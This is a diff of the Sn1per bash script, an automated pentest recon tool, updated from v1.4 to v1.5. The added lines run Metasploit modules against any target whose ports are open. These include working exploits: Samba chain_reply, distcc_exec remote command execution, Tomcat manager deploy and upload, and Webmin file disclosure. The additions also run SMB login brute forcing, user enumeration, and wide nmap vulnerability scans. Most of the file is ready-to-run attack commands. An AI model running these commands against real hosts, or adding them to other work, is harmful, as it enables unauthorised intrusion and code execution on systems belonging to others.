@@ -1,5 +1,5 @@
 #!/bin/bash
-# + -- --=[Sn1per v1.4 by 1N3 v20151213
+# + -- --=[Sn1per v1.5 by 1N3
 # + -- --=[http://crowdshield.com
 #
 # Sn1per - Automated Pentest Recon Tool
@@ -12,6 +12,7 @@
 # - Automatically run targeted nmap scripts against open ports
 # - Automatically scans all web applications
 # - Automatically brute forces all open services
+# - Automatically runs targeted metasploit scan and exploit modules
 #
 # INSTALL:
 # ./install.sh - Installs all dependencies. Best run from Kali Linux. 
@@ -26,9 +27,9 @@ CMSMAP="CMSmap/cmsmap.py"
 SAMRDUMP="bin/samrdump.py"
 DNSDICT6="bin/dnsdict6"
 INURLBR="bin/inurlbr.php"
-USER_FILE="BruteX/simple-users.txt"
-PASS_FILE="BruteX/password.lst"
-DNS_FILE="BruteX/namelist.txt"
+USER_FILE="BruteX/wordlists/simple-users.txt"
+PASS_FILE="BruteX/wordlists/password.lst"
+DNS_FILE="BruteX/wordlists/namelist.txt"
 SUPER_MICRO_SCAN="SuperMicro-Password-Scanner/supermicro_scan.sh"
 THREADS="30"
 OKBLUE='\033[94m'
@@ -46,9 +47,17 @@ if [ -z $TARGET ]; then
 	echo -e "$OKRED               /_/                 $RESET"
 	echo -e "$RESET"
 	echo -e "$OKORANGE + -- --=[http://crowdshield.com"
-	echo -e "$OKORANGE + -- --=[sn1per v1.4 by 1N3"
+	echo -e "$OKORANGE + -- --=[sn1per v1.5 by 1N3"
 	echo -e "$OKORANGE + -- --=[Usage: sn1per <target>"
 	exit
+fi
+
+REGEX='^[0-9]+$'
+if [[ ${TARGET:0:1} =~ $REGEX ]]; 
+	then 
+	SCAN_TYPE="IP"
+else 
+	SCAN_TYPE="DOMAIN"
 fi
 
 clear
@@ -61,30 +70,32 @@ echo -e "$OKRED /____/_/ /_/___/ .___/\___/_/     $RESET"
 echo -e "$OKRED               /_/                 $RESET"
 echo -e "$RESET"
 echo -e "$OKORANGE + -- --=[http://crowdshield.com"
-echo -e "$OKORANGE + -- --=[sn1per v1.4 by 1N3"
+echo -e "$OKORANGE + -- --=[sn1per v1.5 by 1N3"
 echo -e "$RESET"
 echo -e "$OKGREEN################################### Running recon #################################$RESET"
 nslookup $TARGET
 host $TARGET
-dig -x $TARGET
-whois $TARGET
-theharvester -d $TARGET -b google
-theharvester -d $TARGET -b bing
-theharvester -d $TARGET -b linkedin
-theharvester -d $TARGET -b people123
-dnsrecon -d $TARGET
-dnsrecon -d $TARGET -t zonewalk
-dnsrecon -d quora.com -t axfr
-dnsenum $TARGET -f BruteX/namelist.txt
-mv -f *_ips.txt loot/ 2>/dev/null
-shodan host $TARGET
+if [ $SCAN_TYPE == "DOMAIN" ];
+then
+	dig -x $TARGET
+	whois $TARGET
+	theharvester -d $TARGET -b google
+	theharvester -d $TARGET -b bing
+	theharvester -d $TARGET -b linkedin
+	theharvester -d $TARGET -b people123
+	dnsrecon -d $TARGET
+	dnsrecon -d $TARGET -t zonewalk
+	dnsrecon -d quora.com -t axfr
+	dnsenum $TARGET -f BruteX/wordlists/namelist.txt
+	mv -f *_ips.txt loot/ 2>/dev/null
+	shodan host $TARGET
+fi
 echo ""
 echo -e "$OKGREEN################################### Pinging host ###################################$RESET"
 ping -c 1 $TARGET
 echo ""
 echo -e "$OKGREEN################################### Running port scan ##############################$RESET"
-nmap -sS -sV -T4 -A -O --open $TARGET -oX $LOOT_DIR/nmap-$TARGET.xml
-nmap -sU -sV -T4 -A -O -p 53,67,68,88,161,162,137,138,139,389,520,521,2049 --open $TARGET -oX $LOOT_DIR/nmap-udp-$TARGET.xml
+nmap -sS -sU -sV -T4 -A -O -p T:1-65535,U:53,U:67,U:68,U:88,U:161,U:162,U:137,U:138,U:139,U:389,U:520,U:2049 --open $TARGET -oX $LOOT_DIR/nmap-$TARGET.xml
 echo ""
 echo -e "$OKGREEN################################### Running Intrusive Scans ########################$RESET"
 port_21=`grep 'portid="21"' $LOOT_DIR/nmap-$TARGET.xml | grep open`
@@ -111,6 +122,7 @@ port_2049=`grep 'portid="2049"' $LOOT_DIR/nmap-$TARGET.xml | grep open`
 port_2121=`grep 'portid="2121"' $LOOT_DIR/nmap-$TARGET.xml | grep open`
 port_3306=`grep 'portid="3306"' $LOOT_DIR/nmap-$TARGET.xml | grep open`
 port_3389=`grep 'portid="3389"' $LOOT_DIR/nmap-$TARGET.xml | grep open`
+port_3632=`grep 'portid="3632"' $LOOT_DIR/nmap-$TARGET.xml | grep open`
 port_5432=`grep 'portid="5432"' $LOOT_DIR/nmap-$TARGET.xml | grep open`
 port_5800=`grep 'portid="5800"' $LOOT_DIR/nmap-$TARGET.xml | grep open`
 port_5900=`grep 'portid="5900"' $LOOT_DIR/nmap-$TARGET.xml | grep open`
@@ -120,6 +132,7 @@ port_8009=`grep 'portid="8009"' $LOOT_DIR/nmap-$TARGET.xml | grep open`
 port_8080=`grep 'portid="8080"' $LOOT_DIR/nmap-$TARGET.xml | grep open`
 port_8180=`grep 'portid="8180"' $LOOT_DIR/nmap-$TARGET.xml | grep open`
 port_8443=`grep 'portid="8443"' $LOOT_DIR/nmap-$TARGET.xml | grep open`
+port_10000=`grep 'portid="10000"' $LOOT_DIR/nmap-$TARGET.xml | grep open`
 port_49152=`grep 'portid="49152"' $LOOT_DIR/nmap-$TARGET.xml | grep open`
 
 if [ -z "$port_21" ]
@@ -137,6 +150,7 @@ then
 else
 	echo -e "$OKGREEN+ -- --=[Port 22 opened... running tests...$RESET"
 	nmap -sV -sC -p 22 --script=ssh-* $TARGET
+	msfconsole -x "use scanner/ssh/ssh_enumusers; set USER_FILE "$PWD"/BruteX/wordlists/simple-users.txt; setg RHOSTS "$TARGET"; run; use scanner/ssh/ssh_identify_pubkeys; run; use scanner/ssh/ssh_version; run; exit;"
 fi
 
 if [ -z "$port_23" ]
@@ -147,6 +161,7 @@ else
 	echo ""
 	cisco-torch -A $TARGET
 	nmap -sV --script=telnet* -p 23 $TARGET
+	msfconsole -x "use scanner/telnet/lantronix_telnet_password; setg RHOSTS "$TARGET"; setg RHOST "$TARGET"; run; use scanner/telnet/lantronix_telnet_version; run; use scanner/telnet/telnet_encrypt_overflow; run; use scanner/telnet/telnet_ruggedcom; run; use scanner/telnet/telnet_version; run; exit;"
 fi
 
 if [ -z "$port_25" ]
@@ -156,7 +171,7 @@ else
 	echo -e "$OKGREEN+ -- --=[Port 25 opened... running tests...$RESET"
 	nmap -sV --script=smtp* -p 25 $TARGET
 	smtp-user-enum -M VRFY -U $USER_FILE -t $TARGET
-	msfconsole -x "use scanner/smtp/smtp_enum; set RHOSTS "$TARGET"; run;" 
+	msfconsole -x "use scanner/smtp/smtp_enum; set RHOSTS "$TARGET"; run; exit;" 
 fi
 
 if [ -z "$port_53" ]
@@ -164,7 +179,7 @@ then
 	echo -e "$OKRED+ -- --=[Port 53 closed... skipping.$RESET"
 else
 	echo -e "$OKGREEN+ -- --=[Port 53 opened... running tests...$RESET"
-	nmap -sV --script=dns* -p $TARGET	
+	nmap -sV --script=dns* -p U:53,T:53 $TARGET	
 fi
 
 if [ -z "$port_79" ]
@@ -173,7 +188,7 @@ then
 else
 	echo -e "$OKGREEN+ -- --=[Port 79 opened... running tests...$RESET"
 	nmap -sV --script=finger* -p 79 $TARGET
-	bin/fingertool.sh $TARGET BruteX/simple-users.txt
+	bin/fingertool.sh $TARGET BruteX/wordlists/simple-users.txt
 fi
 
 if [ -z "$port_80" ]
@@ -186,9 +201,15 @@ else
 	whatweb http://$TARGET
 	xsstracer $TARGET 80
 	echo ""
-	goohak $TARGET > /dev/null
-	php $INURLBR --dork "site:$TARGET" -s $LOOT_DIR/inurlbr-$TARGET.txt >> $LOOT_DIR/inurlbr-$TARGET.txt
-	rm -Rf output/ cookie.txt exploits.conf
+
+	if [ $SCAN_TYPE == "DOMAIN" ];
+	then
+		goohak $TARGET > /dev/null
+		php $INURLBR --dork "site:$TARGET" -s $LOOT_DIR/inurlbr-$TARGET.txt >> $LOOT_DIR/inurlbr-$TARGET.txt
+		rm -Rf output/ cookie.txt exploits.conf
+	
+	fi
+	
 	nmap -sV -p 80 --script=http-enum,http-feed,http-open-proxy,http-headers,http-cors,http-server-header,http-php-version,http-form-brute,http-iis-short-name-brute,http-waf-fingerprint,http-auth,http-trace,http-iis-webdav-vuln,http-useragent-tester,http-vuln-cve2011-3368,http-userdir-enum,http-passwd,http-csrf,http-wordpress-enum,http-frontpage-login,http-dombased-xss,http-phpself-xss,http-sql-injection,http-drupal-enum-users,http-referer-checker,http-vuln-cve2009-3960,http-methods,http-open-redirect,http-vuln-cve2011-3192,http-stored-xss,http-vuln-cve2013-0156,http-put,http-proxy-brute,http-rfi-spider,http-method-tamper $TARGET
 	echo -e "$OKBLUE+ -- --=[Checking if X-Content options are enabled on $TARGET...$RESET $OKORANGE"
 	curl -s --insecure -I http://$TARGET | egrep -i 'X-Content' | tail -n 10
@@ -282,7 +303,8 @@ else
 	enum4linux $TARGET
 	python $SAMRDUMP $TARGET
 	nbtscan $TARGET
-	nmap -sV --script=/usr/share/nmap/scripts/smb-check-vulns.nse --script=/usr/share/nmap/scripts/smb-os-discovery.nse --script=/usr/share/nmap/scripts/smb-enum-domains.nse --script=/usr/share/nmap/scripts/smb-server-stats.nse --script=/usr/share/nmap/scripts/smb-ls.nse --script=/usr/share/nmap/scripts/smb-vuln-ms10-054.nse --script=/usr/share/nmap/scripts/smb-vuln-ms10-061.nse --script=/usr/share/nmap/scripts/smb-system-info.nse --script=/usr/share/nmap/scripts/smb-enum-shares.nse --script=/usr/share/nmap/scripts/smb-enum-users.nse --script=/usr/share/nmap/scripts/smbv2-enabled.nse --script=/usr/share/nmap/scripts/smb-mbenum.nse --script-args=unsafe=1 -p 139 $TARGET
+	nmap -sV -p139 --script=smb-server-stats --script=smb-ls --script=smb-enum-domains --script=smbv2-enabled --script=smb-psexec --script=smb-enum-groups --script=smb-enum-processes --script=smb-brute --script=smb-print-text --script=smb-security-mode --script=smb-os-discovery --script=smb-enum-sessions --script=smb-mbenum --script=smb-enum-users --script=smb-enum-shares --script=smb-system-info --script=smb-vuln-ms10-054 --script=smb-vuln-ms10-061 $TARGET
+	msfconsole -x "use auxiliary/scanner/smb/pipe_auditor; set RHOSTS "$TARGET"; run; use auxiliary/scanner/smb/pipe_dcerpc_auditor; set RHOSTS "$TARGET"; run; use auxiliary/scanner/smb/psexec_loggedin_users; set RHOSTS "$TARGET"; run; use auxiliary/scanner/smb/smb2; set RHOSTS "$TARGET"; run; use auxiliary/scanner/smb/smb_enum_gpp; set RHOSTS "$TARGET"; run; use auxiliary/scanner/smb/smb_enumshares; set RHOSTS "$TARGET"; run; use auxiliary/scanner/smb/smb_enumusers; set RHOSTS "$TARGET"; run; use auxiliary/scanner/smb/smb_enumusers_domain; set RHOSTS "$TARGET"; run; use auxiliary/scanner/smb/smb_login; set RHOSTS "$TARGET"; run; use auxiliary/scanner/smb/smb_lookupsid; set RHOSTS "$TARGET"; run; use auxiliary/scanner/smb/smb_uninit_cred; set RHOSTS "$TARGET"; run; use auxiliary/scanner/smb/smb_version; set RHOSTS "$TARGET"; run; use exploit/linux/samba/chain_reply; set RHOSTS "$TARGET"; set RHOST "$TARGET"; run; use windows/smb/ms08_067_netapi; set RHOSTS "$TARGET"; set RHOST "$TARGET"; check; exit;"
 fi
 
 if [ -z "$port_162" ]
@@ -290,7 +312,7 @@ then
 	echo -e "$OKRED+ -- --=[Port 162 closed... skipping.$RESET"
 else
 	echo -e "$OKGREEN+ -- --=[Port 162 opened... running tests...$RESET"
-	for a in `cat brutex/snmp-community-strings.txt`; do snmpwalk $TARGET -c $a; done;
+	for a in `cat BruteX/wordlists/snmp-community-strings.txt`; do snmpwalk $TARGET -c $a; done;
 	nmap -p 162 --script=snmp* $TARGET
 fi
 
@@ -317,9 +339,15 @@ else
 	./massbleed $TARGET port 443
 	cd ..
 	nmap -sV -p 443 --script=http-enum,http-feed,http-open-proxy,http-headers,http-cors,http-server-header,http-php-version,http-form-brute,http-iis-short-name-brute,http-waf-fingerprint,http-auth,http-trace,http-iis-webdav-vuln,http-useragent-tester,http-vuln-cve2011-3368,http-userdir-enum,http-passwd,http-csrf,http-wordpress-enum,http-frontpage-login,http-dombased-xss,http-phpself-xss,http-sql-injection,http-drupal-enum-users,http-referer-checker,http-vuln-cve2009-3960,http-methods,http-open-redirect,http-vuln-cve2011-3192,http-stored-xss,http-vuln-cve2013-0156,http-put,http-proxy-brute,http-rfi-spider,http-method-tamper,tls-nextprotoneg,ssl* $TARGET
-	goohak $TARGET > /dev/null 
-	php $INURLBR --dork "site:$TARGET" -s $LOOT_DIR/inurlbr-$TARGET.txt >> $LOOT_DIR/inurlbr-$TARGET.txt
-	rm -Rf output/ cookie.txt exploits.conf
+	
+	if [ $SCAN_TYPE == "DOMAIN" ];
+	then
+		goohak $TARGET > /dev/null
+		php $INURLBR --dork "site:$TARGET" -s $LOOT_DIR/inurlbr-$TARGET.txt >> $LOOT_DIR/inurlbr-$TARGET.txt
+		rm -Rf output/ cookie.txt exploits.conf
+	
+	fi
+	
 	echo -e "$OKBLUE+ -- --=[Checking if X-Content options are enabled on $TARGET...$RESET $OKORANGE"
 	curl -s --insecure -I https://$TARGET | egrep -i 'X-Content' | tail -n 10
 	echo ""
@@ -384,7 +412,8 @@ else
 	enum4linux $TARGET
 	python $SAMRDUMP $TARGET
 	nbtscan $TARGET
-	nmap --script=/usr/share/nmap/scripts/smb-check-vulns.nse --script=/usr/share/nmap/scripts/smb-os-discovery.nse --script=/usr/share/nmap/scripts/smb-enum-domains.nse --script=/usr/share/nmap/scripts/smb-server-stats.nse --script=/usr/share/nmap/scripts/smb-ls.nse --script=/usr/share/nmap/scripts/smb-vuln-ms10-054.nse --script=/usr/share/nmap/scripts/smb-vuln-ms10-061.nse --script=/usr/share/nmap/scripts/smb-system-info.nse --script=/usr/share/nmap/scripts/smb-enum-shares.nse --script=/usr/share/nmap/scripts/smb-enum-users.nse --script=/usr/share/nmap/scripts/smbv2-enabled.nse --script=/usr/share/nmap/scripts/smb-mbenum.nse --script-args=unsafe=1 -p 445 $TARGET
+	nmap -sV -p445 --script=smb-server-stats --script=smb-ls --script=smb-enum-domains --script=smbv2-enabled --script=smb-psexec --script=smb-enum-groups --script=smb-enum-processes --script=smb-brute --script=smb-print-text --script=smb-security-mode --script=smb-os-discovery --script=smb-enum-sessions --script=smb-mbenum --script=smb-enum-users --script=smb-enum-shares --script=smb-system-info --script=smb-vuln-ms10-054 --script=smb-vuln-ms10-061 $TARGET
+	msfconsole -x "use auxiliary/scanner/smb/pipe_auditor; set RHOSTS "$TARGET"; run; use auxiliary/scanner/smb/pipe_dcerpc_auditor; set RHOSTS "$TARGET"; run; use auxiliary/scanner/smb/psexec_loggedin_users; set RHOSTS "$TARGET"; run; use auxiliary/scanner/smb/smb2; set RHOSTS "$TARGET"; run; use auxiliary/scanner/smb/smb_enum_gpp; set RHOSTS "$TARGET"; run; use auxiliary/scanner/smb/smb_enumshares; set RHOSTS "$TARGET"; run; use auxiliary/scanner/smb/smb_enumusers; set RHOSTS "$TARGET"; run; use auxiliary/scanner/smb/smb_enumusers_domain; set RHOSTS "$TARGET"; run; use auxiliary/scanner/smb/smb_login; set RHOSTS "$TARGET"; run; use auxiliary/scanner/smb/smb_lookupsid; set RHOSTS "$TARGET"; run; use auxiliary/scanner/smb/smb_uninit_cred; set RHOSTS "$TARGET"; run; use auxiliary/scanner/smb/smb_version; set RHOSTS "$TARGET"; run; use exploit/linux/samba/chain_reply; set RHOSTS "$TARGET"; set RHOST "$TARGET"; run; use windows/smb/ms08_067_netapi; set RHOSTS "$TARGET"; set RHOST "$TARGET"; check; exit;"
 fi
 
 if [ -z "$port_512" ]
@@ -452,6 +481,15 @@ then
 else
 	echo -e "$OKGREEN+ -- --=[Port 3389 opened... running tests...$RESET"
 	nmap -sV --script=rdp-* -p 3389 $TARGET
+fi
+
+if [ -z "$port_3632" ]
+then
+	echo -e "$OKRED+ -- --=[Port 3632 closed... skipping.$RESET"
+else
+	echo -e "$OKGREEN+ -- --=[Port 3632 opened... running tests...$RESET"
+	nmap -sV --script=distcc-* -p 3632 $TARGET
+	msfconsole -x "setg RHOST "$TARGET"; setg RHOSTS "$TARGET"; use unix/misc/distcc_exec; run; exit;"
 fi
 
 if [ -z "$port_5432" ]
@@ -544,7 +582,7 @@ else
 	cd ..
 	nikto -h http://$TARGET:8080 
 	nmap -p 8080 --script=*proxy* $TARGET
-	
+	msfconsole -x "use admin/http/tomcat_administration; setg RHOST "$TARGET"; setg RPORT 8080; setg RHOSTS "$TARGET"; run; use admin/http/tomcat_utf8_traversal; run; use scanner/http/tomcat_enum; run; use scanner/http/tomcat_mgr_login; run; use multi/http/tomcat_mgr_deploy; run; use multi/http/tomcat_mgr_upload; run; exit;"
 fi
 
 if [ -z "$port_8180" ]
@@ -581,6 +619,14 @@ else
 	cd ..
 	nikto -h http://$TARGET:8443 
 	nmap -p 8443 --script=*proxy* $TARGET
+fi
+
+if [ -z "$port_10000" ]
+then
+	echo -e "$OKRED+ -- --=[Port 10000 closed... skipping.$RESET"
+else
+	echo -e "$OKGREEN+ -- --=[Port 10000 opened... running tests...$RESET"
+	msfconsole -x "use auxiliary/admin/webmin/file_disclosure; setg RHOST "$TARGET"; setg RHOSTS "$TARGET"; run; exit;"
 fi
 
 if [ -z "$port_49152" ]
